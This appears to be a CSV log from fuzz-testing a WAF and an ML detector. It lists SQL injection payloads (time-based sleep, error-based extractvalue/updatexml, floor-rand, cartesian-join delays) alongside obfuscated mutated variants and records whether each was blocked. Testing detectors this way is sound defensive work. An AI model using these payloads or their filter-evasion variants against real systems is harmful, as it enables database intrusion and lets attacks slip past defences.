Sr NO.,Original Timestamp,Payload,Original Status,WAF Status,ML Status,Combined Result,Fuzzed Payload 1,Fuzzed Timestamp 1,WAF Status 1,ML Status 1,Combined Result 1,Fuzzed Payload 2,Fuzzed Timestamp 2,WAF Status 2,ML Status 2,Combined Result 2,Fuzzed Payload 3,Fuzzed Timestamp 3,WAF Status 3,ML Status 3,Combined Result 3,Fuzzed Payload 4,Fuzzed Timestamp 4,WAF Status 4,ML Status 4,Combined Result 4,Fuzzed Payload 5,Fuzzed Timestamp 5,WAF Status 5,ML Status 5,Combined Result 5
25,2024-12-16T21:43:34.196774,29540,200,200,200,both_correct,"/**/or
(SElecT 3429) not like 3430",2024-12-16T21:43:34.584563,403,403,both_incorrect,/*gq*/Or (SeLeCT 'Pfk5' likE 'Pfk5') not like (sEleCT (seLeCt/**/1)),2024-12-16T21:43:37.280623,200,200,both_correct,/*gq*/OR	(sELECT  AND 1 LIKE 1666) not/**/lIkE (SELect (seLeCT/**/0x1)),2024-12-16T21:43:41.590610,200,403,waf_correct_ml_incorrect,"/*gq*/Or
(seLeCT  aND  AND 1 lIke (SELECt 'OS' like 'OS')) not/**/lIkE (SElECT (SElecT 0x1))",2024-12-16T21:43:46.072316,403,403,both_incorrect,/*gq*/OR (SeLEcT  anD  And  ANd 'B'!='B/' LIKE (SeLect 'OS' LiKe 'OS')) not LIKe (seleCt (SELECt 0x1)),2024-12-16T21:43:51.587429,200,403,waf_correct_ml_incorrect
26,2024-12-16T21:43:57.610021,10328,200,200,200,both_correct,(seleCt (seleCt 1)) LIKE 8505,2024-12-16T21:43:57.969140,403,403,both_incorrect,"(Select/*h8*/(sElect  aND
(SeLeCT 1))) LIKe 'mE' like 'mE'",2024-12-16T21:44:00.718844,403,403,both_incorrect,"(SeLeCt (SELECT  and (SELect 0x18ac IN ((SELECT 1),6316,6317)))) LiKe 'mE' lIKE 'mE'",2024-12-16T21:44:04.610533,403,403,both_incorrect,"(sElEct (SeLECT  ANd (SElEcT 0x18ac iN
((SEleCt  AND 1),'""P*' not/**/like '""P*#',(SELECT 6317))))) liKE 'mE' LIke 'mE'c",2024-12-16T21:44:09.684716,403,403,both_incorrect,"(SELEct (select	 aND (select 0x18ac in
((select  And 0x1),'""P*' not like '""P*#',(SELect  OR 't*`,' Like 't*`,'))))) LIke 'mE' liKE 'mE'c}",2024-12-16T21:44:16.396273,403,403,both_incorrect
27,2024-12-16T21:44:23.974360,roger,200,200,200,both_correct,roger,2024-12-16T21:44:24.350851,200,200,both_correct,roger,2024-12-16T21:44:25.709615,200,200,both_correct,roger,2024-12-16T21:44:27.104384,200,200,both_correct,roger,2024-12-16T21:44:28.462709,200,200,both_correct,roger,2024-12-16T21:44:29.836222,200,200,both_correct
28,2024-12-16T21:44:31.198571,"1  )   and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and   (  9841  =  9841",403,403,403,both_correct,"(SELECT 1)  )   aNd 5897 not like 5898  =    (  sElECT count  (  *  ) 
 FROm sysusers AS sys1,sysusers AS sys2,sysusers aS sys3,sysusers aS sys4,sysusers As sys5,sysusers As sys6,sysusers aS/**/sys7  )   and   (   aND 1  =  9841",2024-12-16T21:44:40.977750,403,403,both_correct,"(SElecT 1)  )   aND 5897 not like 5898  =    (  SELeCT/**/count  (  *  )   FRom sysusers as sys1,sysusers aS sys2,sysusers AS sys3,sysusers AS sys4,sysusers as sys5,sysusers aS sys6,sysusers As/*WrP\,*/sys7  )   anD   (   and (sElect (SELECT 1))  =  '/' LIKE '/'",2024-12-16T21:44:52.694378,403,403,both_correct,"(seLEct (SELECT 1))  )  
AnD/**/5897 not like 1651!=1652   like     (  sElEcT/**/count  (  *  )   froM sysusers aS sys1,sysusers aS sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers AS sys6,sysusers as/**/sys7  )   And   (   ANd (selEct (seleCT (SELECT 1)))  =  '/' Like '/'",2024-12-16T21:45:06.428007,403,403,both_correct,"(SeleCT	(SElect '~""' NOT LIKE '~""['))  )/**/ 
and/**/5897 not like  && 1!=1652   LIKE     (  SElEct/**/count  (  *  )   FRom sysusers AS sys1,sysusers As sys2,sysusers aS sys3,sysusers as sys4,sysusers aS sys5,sysusers aS sys6,sysusers AS/**/sys7  )   aND   (   anD (seLect (SELEct (selecT (SELECT 1))))  =  '/' Like '/'",2024-12-16T21:45:21.263534,403,403,both_correct,"(SelEcT
(sElEcT '~""' NOT LIKE '~""['))  )/*P*/ 
aND (sELEcT 5860=5860) not like  && 1 NOT LIKE (Select 1652)   LiKe     (  SElecT/**/count  (  *  )   frOM sysusers AS sys1,sysusers As sys2,sysusers AS sys3,sysusers as sys4,sysusers aS sys5,sysusers As sys6,sysusers aS/**/sys7  )   aNd   (   aND (sElEcT (SeleCT (sELecT (SeLECT 1))))  =  '/' LIKE '/'",2024-12-16T21:45:37.587079,403,403,both_correct
29,2024-12-16T21:45:55.285620,select sleep  (  5  )   and 'beuk'  =  'beuk,403,403,200,waf_correct_ml_incorrect,sElECt sleep  (  0x5  )	  And 'beuk'   LIkE  /**/'beuk,2024-12-16T21:45:57.493321,403,200,waf_correct_ml_incorrect,seLecT sleep  (  0x5  )   and 'beuk'   LiKe   'beuk,2024-12-16T21:46:01.124315,403,200,waf_correct_ml_incorrect,SElECt sleep  (  0x5  )   anD 'beuk'	 /**/LIkE   'beuk,2024-12-16T21:46:04.654046,403,200,waf_correct_ml_incorrect,"sElECT sleep  (  0x5  )   aND 'beuk'
  LikE   'beuk",2024-12-16T21:46:08.270715,403,403,both_correct,"SEleCT sleep  (/**/ 0x5  )   AnD 'beuk'
 
Like   'beuk",2024-12-16T21:46:11.757760,403,403,both_correct
30,2024-12-16T21:46:15.654615,47400,200,200,200,both_correct, aNd	492 LIKE/**/(SELECT 492),2024-12-16T21:46:16.038159,200,403,waf_correct_ml_incorrect," and	(SELECT  or 0)/**/lIKE/*heJg=*/(seLEcT
'A'='A')",2024-12-16T21:46:18.467074,200,403,waf_correct_ml_incorrect, AND	(sElecT /**/oR 0x0)/*(Bq{*/LikE/*heJg=*/(Select  && ')'=')'),2024-12-16T21:46:21.980210,200,200,both_correct, and	(seLeCt 	or 0x0)/*(Bq{*/lIke/**/(sELeCT  && ')'=')'),2024-12-16T21:46:26.084704,200,200,both_correct,	and	(SELecT 	oR/**/0x0)/*(Bq{*/lIKe/**/(SElECt  && ')' lIKe ')'),2024-12-16T21:46:29.900977,200,200,both_correct
31,2024-12-16T21:46:34.045599,*ayustar,200,200,200,both_correct,*ayustar,2024-12-16T21:46:34.581860,200,200,both_correct,*ayustar,2024-12-16T21:46:36.078180,200,200,both_correct,*ayustar,2024-12-16T21:46:37.607857,200,200,both_correct,*ayustar,2024-12-16T21:46:39.116259,200,200,both_correct,*ayustar,2024-12-16T21:46:40.624608,200,200,both_correct
32,2024-12-16T21:46:42.124053,jerusaln,200,200,200,both_correct,jerusaln,2024-12-16T21:46:42.617959,200,200,both_correct,jerusaln,2024-12-16T21:46:44.116438,200,200,both_correct,jerusaln,2024-12-16T21:46:45.648246,200,200,both_correct,jerusaln,2024-12-16T21:46:47.193587,200,200,both_correct,jerusaln,2024-12-16T21:46:48.708827,200,200,both_correct
33,2024-12-16T21:46:50.214547,-1219'  )   or 5592  =  4835,403,403,200,waf_correct_ml_incorrect,"- aND 1'  )  /**/oR 0x15d8   LiKE  
'[,'!='[,A'",2024-12-16T21:46:51.622200,403,200,waf_correct_ml_incorrect,"- aNd (SELECT 9352 not like (SELECT 1))'	 )/**/ /*VC|)q*/oR 0x15d8   LiKE  
'[,'!='[,A'",2024-12-16T21:46:55.222263,403,403,both_correct,"- aND (seLect (SeLEcT 4209 IN (4208,4209,4210)) not/**/like (sELeCT 0x1))'
 )/**/ /*VC|)q*/oR 0x15d8   LiKE  
'[,'!='[,A'",2024-12-16T21:47:00.438612,403,200,waf_correct_ml_incorrect,"- anD (sElect (SeleCt 4209 in (0x1070, AnD '%t' like '%t',4210)) not/**/LIkE (Select 0x1))'
 )/**/ /*VC|)q*/oR/**/0x15d8   LiKE   '[,'!='[,A'",2024-12-16T21:47:07.259896,200,200,both_incorrect,"- aNd (sEleCt (SelecT  AND 6402<>6403 in (0x1070, AnD	'%t' LIKe '%t',(SELECT 4210))) not/**/LIke (seLECT 0x1))'
 )/**/ /*VC|)q*/oR 0x15d8   LiKE   '[,'!='[,A'",2024-12-16T21:47:15.079642,200,403,waf_incorrect_ml_correct
34,2024-12-16T21:47:23.962527,"1 where 6881  =  6881 procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )  --",403,403,200,waf_correct_ml_incorrect," && 1 WhErE 6881 /**/=  208<>209 procedure analyse  (  extractvalue  (  (SELECT 5840),concat  (  0x5c,0x7171706a71,  (  SElecT   (  caSE wHEN   (  5840  =  5840  )   ThEn 1 eLSE 0	ENd   )    )   ,0x717a767a71   )    )   ,1  )  --",2024-12-16T21:47:33.874573,403,403,both_correct," && 1 WhERe 6881 /**/= /**/208<>'
o@9'<>'
o@9A' procedure analyse  (  extractvalue  (  (selECt 5840),concat  (  0x5c,0x7171706a71,  (  SELect   (  Case WHen   (	 5840   lIKE   5840  )   THEn  AND 1 ElSE 0	EnD   )    )   ,0x717a767a71   )    )   ,(sELeCt 1)  )  --",2024-12-16T21:47:45.936465,403,200,waf_correct_ml_incorrect," && 1 whErE 6881   LIKE  /**/208<>'
o@(SELECT 9)'<>'
o@9A' procedure analyse  (  extractvalue  (  (sELeCt 5840),concat  (  0x5c,0x7171706a71,  (  seLeCt   (  CASe wHEN   (	 'z' lIke 'z'   LikE   5840  )   tHen  And (SELect 1) Else 0	END   )   
)   ,0x717a767a71   )    )   ,(sEleCt 1)  )  --",2024-12-16T21:47:59.322178,403,200,waf_correct_ml_incorrect,"  AND  1
wHere 6881/**/  likE  /**/208<>'
o@(SELECT ''!='+')'<>'
o@9A' procedure analyse  (  extractvalue  (  (sElECt 5840),concat  (  0x5c,0x7171706a71,  (  sELect   (  CasE whEN   (	 'z' lIke 'z'   liKE    AND 1  )   THEn  aND (SELeCT 1) ELSE 0	END   )   
)   ,0x717a767a71   )    )   ,(sElEct (SELECT 1))  )  --",2024-12-16T21:48:14.241545,403,403,both_correct,"  ANd   AND 3439 IN (3438,3439,3440)
WHERe 6881/*hud<0x4*/  liKe   208<>'
o@(SELECT ''!='+')' NOT LIKE '
o@9A' procedure analyse  (  extractvalue  (  (sELeCT 5840),concat  (  0x5c,0x7171706a71,  (  sELeCt   (  CASe WHEn   (  'z' lIkE 'z'   lIKE    ANd 1  )   ThEN  anD (SELEcT 1) ElSE 0	End   )   
)   ,0x717a767a71   )    )   ,(sELECT (seLeCt 1))  )  --",2024-12-16T21:48:30.156656,403,403,both_correct
35,2024-12-16T21:48:47.979761,"1'  )   and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and   (  'jvll' like 'jvll",403,403,403,both_correct,"1'  )   and row  (  6237,7469  )  > /**/(  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  'j7d'='j7d',1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2  
)    )   x from   (  select  AND 0x1 union select 3785 union select 3931 union select 7158  )  a group by x  )   and   (  'jvll' like 'jvll",2024-12-16T21:49:03.423314,403,403,both_correct,"1'  )   and row  (  6237, AND 1  )  > /**/(  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  'j7d'='j7d',1   )    )   /**/ )  ,0x717a767a71,floor  (  rand  (  0  )  *'X%' NOT LIKE 'X%;'  	)    )   x from   (  select  AND 0x1 union select 3785 union select 0xf5b union select 7158  )  a group by x  )   and   (  'jvll' like 'jvll",2024-12-16T21:49:20.377259,403,403,both_correct,"(Select 1)'  )   and row  (  6237, AND (SELECT 1)  )  > /**/(  select count  (  *	 )  ,concat  (  0x7171706a71,/**/ (  select   (  elt  (  6237  =  'j7d'='j7d',1   )    )   /**/ )  ,0x717a767a71,floor  (  rand  (  0  )  *'X%' NOT LIKE 'X%;'  	)    )   x from   (  select  AND 0x1 union select 3785 union select 0xf5b union select ':>'=':>'  )  a group by x  )   and   (  'jvll' like 'jvll",2024-12-16T21:49:38.515314,403,403,both_correct,"(SeLecT 1)'  )   and row  (  'qv'!='qv$', AND (SELECT (SELECT 0x1))  )  > /**/(  select count  (  *	 )  ,concat  (  0x7171706a71,  (  select   ( 
elt  (  6237  =  'j7d'='j7d',1   )    )   /**/ )  ,0x717a767a71,floor  (  rand  (  0  )  *'X%' NOT LIKE 'X%;'  	)    )   x from   (  select  AND 0x1 union select 3785 union select 0xf5b union select ':>'=':>'  )  a group by x  )   and   (  'jvll' like 'jvll",2024-12-16T21:49:57.998498,403,403,both_correct,"(seLEct 1)'  )   and row  (  'qv'!='qv$', AND (SELECT (SELECT 0x1))  )  >  (  select count  (  *	 )  ,concat  (  0x7171706a71,  (  select   (  elt  (  0x185d  =  'j7d'='j7d',1   )    )   /**/ )  ,0x717a767a71,floor  (  rand  (  0  )  *'X%' NOT LIKE 'X%;'  	)    )   x from   (  select  AND 0x1 union select (SELECT 1)!=2618 union select 0xf5b union select ':>'=':>'  )  a group by x  )   and   (  'jvll' like 'jvll",2024-12-16T21:50:18.116834,403,403,both_correct
36,2024-12-16T21:50:38.725631,13082383y,200,200,200,both_correct,13082383y,2024-12-16T21:50:39.281383,200,200,both_correct,13082383y,2024-12-16T21:50:40.825847,200,200,both_correct,13082383y,2024-12-16T21:50:42.383488,200,200,both_correct,13082383y,2024-12-16T21:50:43.983794,200,200,both_correct,13082383y,2024-12-16T21:50:45.531596,200,200,both_correct
37,2024-12-16T21:50:47.095835,r3i8a83nt1,200,200,200,both_correct,r3i8a83nt1,2024-12-16T21:50:47.706839,200,200,both_correct,r3i8a83nt1,2024-12-16T21:50:49.303074,200,200,both_correct,r3i8a83nt1,2024-12-16T21:50:50.908992,200,200,both_correct,r3i8a83nt1,2024-12-16T21:50:52.496493,200,200,both_correct,r3i8a83nt1,2024-12-16T21:50:54.113087,200,200,both_correct
38,2024-12-16T21:50:55.738420,"1'  )   as vmmk where 5757  =  5757 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",403,403,403,both_correct,"1'  )   AS vmmk WhERe  oR 0x0   liKe   5757 or 7635 NOT LIKE 7636  =    (  seLEct count  (/**/ *  )   FROm domain.domains As t1,domain.columns as t2,domain.tables AS t3  ) 	--",2024-12-16T21:51:02.899177,403,403,both_correct,"(SELECT 1)'  )   as vmmk WheRe  OR 0x0   Like   (SELECT 1) IN (6142,6143,6144) Or 7635 NOT LIKE 7636   LIke     (  selEct count  (/**/ *  )   FrOM	domain.domains/**/AS t1,domain.columns aS t2,domain.tables As t3  ) 	--",2024-12-16T21:51:12.566040,403,403,both_correct,"(sElEct  OR 0)'  )   as vmmk WheRe  OR 0x0   Like   (SELECT 1) IN ('*[T{'!='*[T{L',6143,6144) oR 7635 not like 0x1dd4   lIKE     (  SElect count  (  *  )   fROM	domain.domains/**/AS t1,domain.columns aS t2,domain.tables As t3  ) 
--",2024-12-16T21:51:23.851353,403,403,both_correct,"(SeLect  or (seLECT 0))'  )   as vmmk/**/WheRe  OR 0x0   Like   (SELECT '{""' NOT LIKE '{""H') IN ('*[T{'!='*[T{L',6143, oR 0) Or 7635 not like 0x1dd4   LiKe     (  SeLECT count  (  *  )   FrOM
domain.domains/**/As t1,domain.columns aS t2,domain.tables As t3  ) 
--",2024-12-16T21:51:36.030944,403,403,both_correct,"(sELEct  Or (SElECt '\' LIKE '\'))'  )   As vmmk WheRE  or 0x0   LIKe   (sELeCT '{""' not like '{""H') in ('*[T{'!='*[T{L',6143, or 0) Or (SelecT (SeLECT 1)) not like 0x1dd4   like 
   (  selECt count  (  *  )   FRom
domain.domains/**/aS t1,domain.columns aS t2,domain.tables AS t3  ) 
--",2024-12-16T21:51:49.467618,403,200,waf_correct_ml_incorrect
39,2024-12-16T21:52:04.244572,"select * from generate_series  (  9964,9964,case when   (  9964  =  4455  )   then 1 else 0 end  )   limit 1--",403,200,403,waf_incorrect_ml_correct,"SElect * FroM generate_series  (/**/ 9964,9964,CASe wHEN   (
  anD 1   LIkE   0x1167  )   THEn 1 eLSE 'zZ %'!='zZ %j' EnD  )   limit 1--",2024-12-16T21:52:09.592764,200,200,both_incorrect,"SelEct * From generate_series  (  3542!=3543,9964,CASe WheN   (   aNd  and 1   Like   0x1167  )   THEN 0x1 ELse 'zZ %'!='zZ %j' ENd  )   limit 1--",2024-12-16T21:52:17.061006,200,200,both_incorrect,"SeLeCt * FROm generate_series  (  3542!=3543,9964,cAsE whEN   ( /**/ anD  and (sELecT (SELECT 7422 NOT LIKE 7423))   liKe   0x1167	 )   THeN 0x1 elSe 'zZ %'<>'zZ %j' end  )   limit 1--",2024-12-16T21:52:25.228055,200,403,waf_incorrect_ml_correct,"SeLect */**/FROm generate_series  (  3542!=3543,9964,CaSe WhEn   ( /**/ AnD  AnD (SELEct (SeLeCt 7422 not like 5567 in ( Or (SELECT 0),5567,5568)))   likE   0x1167  )   TheN 0x1 elsE 'zZ %'<>'zZ %j' ENd  )   limit 1--",2024-12-16T21:52:35.166379,200,403,waf_incorrect_ml_correct,"sELeCt */**/from generate_series  (  3542!=0xdd7,9964,case WheN   (   anD  ANd (SeLect (SELEct 7422 not like 5567 in ( OR (SelECt  AND 1),'Z['<>'Z[#',5568)))   LiKE   0x1167  )   tHEn 0x1 ElsE	'zZ %'!='zZ %j' EnD  )   limit 1--",2024-12-16T21:52:46.337618,200,200,both_incorrect
40,2024-12-16T21:52:58.565263,1' where 8945  =  8945 and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )  --,403,403,200,waf_correct_ml_incorrect,628 like  AND 1' where 8945  =  8945 and 6240/*akTz*/ =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else (SELECT 0) end from rdb$database  )	 ||'qzvzq'  )  --,2024-12-16T21:53:05.264575,403,403,both_correct,"628 lIKE /**/and 1321 IN (1320,1321,1322)' where 8945  =  8945 and 6240/**/ =    (	 'qqpjq'||  (  select case 6240 when  OR 0 then 1 else (SELECT 0x0) end from rdb$database  )	 ||'qzvzq'  )  --",2024-12-16T21:53:14.176532,403,403,both_correct,"628 like /**/AnD '4f'<>'4f^' In (1320,0x529,1322)' where 8945  =  8945 and (SELECT 1)  =    (  'qqpjq'||  (  select case 6240 when  OR 0 then 1 else (SELECT 0x0) end from rdb$database  )	 ||'qzvzq'  )  --",2024-12-16T21:53:24.655556,403,403,both_correct,"628 LIke /*U*/aND	'4f' NOT LIKE '4f^' iN (1320,0x529, OR 0)' where 8945  =  3068 NOT LIKE 3069 and (SELECT 1)  =    (  'qqpjq'||  (  select case 6240 when  OR (SELECT 0) then 1 else (SELECT 0x0) end from rdb$database /**/)	 ||'qzvzq'  )  --",2024-12-16T21:53:35.438489,403,403,both_correct,"628 lIke /**/ANd	'4f' NOT LIKE '4f^' iN (1320,0x529, || 6781<>6782)' where 8945  =  3068 NOT LIKE  AND 1 and (SELECT 1)  =    (  'qqpjq'||  (  select case 6240 when  OR (SELECT 0) then 0x1 else (SELECT 0x0) end from rdb$database /**/)
 ||'qzvzq'  ) /**/--",2024-12-16T21:53:48.175137,403,403,both_correct
41,2024-12-16T21:54:01.375838,"-2759%""   )    )    or 7769  =  1249#",403,403,200,waf_correct_ml_incorrect,"-0xac7%""   )    ) /**/  oR 'rGHD' NOT LIKE 'rGHDZ'  
likE    oR 0#1*",2024-12-16T21:54:03.251768,403,403,both_correct,"-0xac7%""   )    )    OR 'rGHD' not like 'rGHDZ'  
LIkE 	  Or (SELECT 1)<>6062#0x1*.",2024-12-16T21:54:07.801159,403,403,both_correct,"-0xac7%""   )    )    or 'rGHD' not like 'rGHDZ'  	LiKe 	 /*t#bf>*/or (seleCt 0x1)!=(SELECT 4628 IN (4627,4628,4629))#0x1*.",2024-12-16T21:54:12.873960,403,403,both_correct,"-0xac7%""   )    )    oR/**/'rGHD' not like 'rGHDZ'	 	Like 	 /*\$*/oR (seLECt 0x1)<>(SEleCT (SELECT 4628) in (4627, OR 0 IN (5691,5692,5693),4629))#0x1*.",2024-12-16T21:54:19.776493,403,403,both_correct,"-0xac7%""   )    )    oR/**/'rGHD' not like 'rGHDZ'	 	likE   /**/oR (SELect 0x1)!=(selecT (sELeCt 4628) IN (4627, Or/**/0 iN ( OR 0x0 iN (4229,4230,4231),5692,5693),4629))#0x1*.
3",2024-12-16T21:54:28.048971,403,200,waf_correct_ml_incorrect
42,2024-12-16T21:54:37.770222,"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and 'conm' like 'conm",403,403,200,waf_correct_ml_incorrect,"SEleCt count  (  *  )  	fROm/**/sysibm.systables aS t1,sysibm.systables aS t2,sysibm.systables aS t3 AnD 'conm' LiKE 'conm",2024-12-16T21:54:43.476989,403,200,waf_correct_ml_incorrect,"sELECt count  (  *  )  
FROM/**/sysibm.systables as t1,sysibm.systables as t2,sysibm.systables/**/aS t3 ANd 'conm' LiKe 'conm",2024-12-16T21:54:50.248878,403,200,waf_correct_ml_incorrect,"SelECT count  (  *  )  
FRom/**/sysibm.systables As t1,sysibm.systables As t2,sysibm.systables/**/as t3/**/aND 'conm'
likE 'conm",2024-12-16T21:54:57.262207,403,200,waf_correct_ml_incorrect,"SeLeCT count  (  *  )  	FROM sysibm.systables AS t1,sysibm.systables AS t2,sysibm.systables/**/aS t3/**/AND 'conm'
lIke 'conm",2024-12-16T21:55:04.742773,403,200,waf_correct_ml_incorrect,"sELEct count  (  *  )  	FrOm sysibm.systables As t1,sysibm.systables As t2,sysibm.systables/**/aS t3/*>0I4(*/&& 'conm'	LIKe/**/'conm",2024-12-16T21:55:11.780313,403,200,waf_correct_ml_incorrect
43,2024-12-16T21:55:19.146280,"1   )    )     )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and    (    (     (  9474  =  9474",403,403,200,waf_correct_ml_incorrect,"'z/S'<>'z/Sq'   )    )     )   OR updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  seLeCt   (  elt  (  1808   lIKE   1808,(SELECT 1)   )    )     )  ,0x717a767a71  )  ,(SELECT 8666)  )   aNd    ( /**/  (    	(  9474  =  9474",2024-12-16T21:55:28.489337,403,200,waf_correct_ml_incorrect,"'z/S'<>'z/Sq'   )    )     )   OR updatexml  (  'd'<>'dU',concat  (  0x2e,0x7171706a71,  (  seLect   (  elt  (  (SElECT 1)   lIKe   (sELeCT 1808),(SELecT 1)   )    ) /**/   )  ,0x717a767a71  )  ,(sELecT 8666)  )   And    ( /*nLvz	*/  (     (  9474   lIkE   9474",2024-12-16T21:55:40.343214,403,200,waf_correct_ml_incorrect,"'z/S' not like 'z/Sq'   )    )     )   or updatexml  (  'd'<>'dU',concat  (  0x2e,0x7171706a71,  (  SELEcT   (  elt  (  (SElECt 1)   liKe   (seLeCT 1808),(SELECt 1)	  )    ) /**/   )/**/ ,0x717a767a71  )  ,(sELEcT 6701<>6702)  )   AnD    ( /*nLvz	*/  (     (   OR 0   LIkE   0x2502",2024-12-16T21:55:54.008189,403,200,waf_correct_ml_incorrect,"'z/S' not like 'z/Sq'   )    )     )   OR updatexml  (  'd'!='dU',concat  (  0x2e,0x7171706a71,  (  SElEct   (  elt  (  (SeLeCT 1)   like   (SELecT 2659 IN (2658,2659,2660)),(SelEct 0x1)   )    )     )/**/ ,0x717a767a71  )  ,(selecT 6701<>(SELECT 1))  )   And    ( /*nLvz	*/  (     (   OR 0   like   0x2502",2024-12-16T21:56:08.242072,403,200,waf_correct_ml_incorrect,"'z/S' not like 'z/Sq'   )    )     )   OR updatexml  (  'd' NOT LIKE 'dU',concat  (  0x2e,0x7171706a71,  (  seLeCt   (  elt  (  (SelECt 1)   liKE   (SeLect 2659 iN ((SeLect 1),'pQ'!='pQ\',(SeLeCT 2660))),(SelEct 0x1)   )	   )     )  ,0x717a767a71  )  ,(SeLeCt 6701<>(seleCt 1))  )   aNd    ( /**/  (     (   Or 0   LikE   0x2502",2024-12-16T21:56:23.959582,403,200,waf_correct_ml_incorrect
44,2024-12-16T21:56:40.673111,"1'   )    )    or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and    (    (   'wbsz'  =  'wbsz",403,403,403,both_correct,"72<>(SELECT 1)'   )    )    or row  ( /**/1045,7562  )  >  (  select count  (  *  )
 ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select (SELECT 8488) union select 5584 union select 3051 union select 1210  )  a group by x  )   and    (    (   'wbsz'  =  'wbsz",2024-12-16T21:56:56.468103,403,403,both_correct,"72 NOT LIKE (sELect 1)'   )    ) 	  or row  ( /**/1045,7562  )  >  (  select count  (  *  )
 ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *(SELECT 2)   )    )   x from   (  select (SELECT 8488) union select 5584/**/union select 8680 LIKE 8680 union select  AND 1  )  a group by x  )   and    (    (   'wbsz'  =  'wbsz",2024-12-16T21:57:14.775958,403,403,both_correct,"72 not like (sEleCT 1)'   )    ) 	  or row  ( /**/1045,7562  )  >  (  select count  (
 *  )
 ,concat  ( /**/0x7171706a71,  (  select   (  elt  (  1045  =  'xc'<>'xcA', AND 1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *(SELECT (SELECT 2))   )    )   x from   (  select (SELECT 8488) union select 5584/**/union select 8680 LIKE 8680 union select  AND 1  )  a group by x  )   and    (    (   'wbsz'  =  'wbsz",2024-12-16T21:57:34.472392,403,403,both_correct,"72 not like (SELECt 1)'   )    ) 	  or row  ( /**/1045, AND 1  )  >  (  select count  (
 *  )  ,concat  ( /**/0x7171706a71,  (  select   (  elt  (  1045  =  'xc'<>'xcA', AND 2662 LIKE 2662   )    )     )  ,0x717a767a71,floor  (  rand  (  (SELECT 0)  )  *(SELECT (SELECT 2))   )    )   x from   (  select (SELECT 8488) union select 5584 union select 8680 LIKE 8680 union select  AND 1  )  a group by x  )   and    (    (   'wbsz'  =  'wbsz",2024-12-16T21:57:55.492449,403,403,both_correct,"(SeLECT 72) not like (selECT 1)'   )    ) 	  or row  ( /**/1045, AND 'g(' LIKE 'g('  )  >  (  select count  (	 *  )  ,concat  ( /**/0x7171706a71,  (  select   (  elt  (  1045  =  'xc'<>'xcA', AND 2662 LIKE 2662   )    )     )  ,0x717a767a71,floor  (  rand  (  (SELECT 0)  )  *(SELECT (SELECT 2))   )    )   x from   (  select (SELECT 8488) union select 5584 union select  OR 0 LIKE 8680 union select  AND 1  )/**/ a group by x  )   and    (    (   'wbsz'  =  'wbsz",2024-12-16T21:58:17.277626,403,403,both_correct
